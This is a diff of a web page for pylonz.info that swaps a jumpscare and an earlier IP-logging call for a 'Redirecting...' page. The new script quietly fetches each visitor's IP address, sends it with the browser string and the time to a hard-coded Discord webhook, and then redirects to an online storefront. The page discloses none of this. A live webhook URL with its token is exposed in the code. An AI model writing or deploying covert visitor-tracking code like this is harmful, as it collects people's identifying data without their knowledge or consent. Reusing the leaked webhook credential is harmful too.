@@ -3,52 +3,42 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Pylonz</title>
-  <style>
-    body { margin: 0; text-align: center; font-family: Arial, sans-serif; }
-    #scare {
-      display: none;
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%;
-      height: 100%;
-      background: black;
-      z-index: 9999;
-    }
-    #scare img { 
-      max-width: 100%; 
-      max-height: 100%; 
-      margin-top: 50px;
-    }
-  </style>
+  <title>Pylonz Redirect</title>
 </head>
 <body>
-  <h1>Welcome to Pylonz</h1>
-  <p>Your visit is being logged...</p>
-
-  <div id="scare">
-    <img src="https://i.imgur.com/3lZ9h0K.jpg" alt="Jumpscare">
-    <audio id="scream" src="https://www.soundjay.com/horror/sounds/scream-01.mp3"></audio>
-  </div>
+  <p>Redirecting...</p>
 
   <script>
-    // --- IP Logging ---
-    fetch("https://pylonz-worker.pylonzasfontwitch.workers.dev")
-      .catch(err => console.error("Failed to log visitor:", err));
+    // 🚨 Replace this with your Discord webhook URL
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1410049032516141129/UfvS9xV4ddgTJhX8mod01-VhzplttOGYv22AltrrDkL9G3bSz0lEzoX5PA-StnkpN4fn";
 
-    // --- Jumpscare ---
-    window.addEventListener('load', () => {
-      const scareDiv = document.getElementById('scare');
-      const scream = document.getElementById('scream');
-      scareDiv.style.display = 'block';
-      scream.play();
-      
-      // Optional: hide scare or redirect after 2 seconds
-      setTimeout(() => {
-        scareDiv.style.display = 'none';
-        // window.location.href = 'https://example.com'; // optional redirect
-      }, 2000);
-    });
+    // Function to log IP and then redirect
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => {
+        const ip = data.ip;
+        const userAgent = navigator.userAgent;
+        const timestamp = new Date().toLocaleString("en-US", { timeZone: "America/New_York" });
+
+        const msg = {
+          content: `📌 New visitor on pylonz.info
+🌐 IP: **${ip}**
+🖥️ Browser: ${userAgent}
+⏰ Time (EST): ${timestamp}`
+        };
+
+        // Send data to Discord
+        fetch(WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(msg)
+        });
+      })
+      .catch(err => console.error("Error fetching IP:", err))
+      .finally(() => {
+        // Redirect after logging
+        window.location.href = "https://lostservicess.mysellauth.com"; // Replace with your target site
+      });
   </script>
 </body>
 </html>
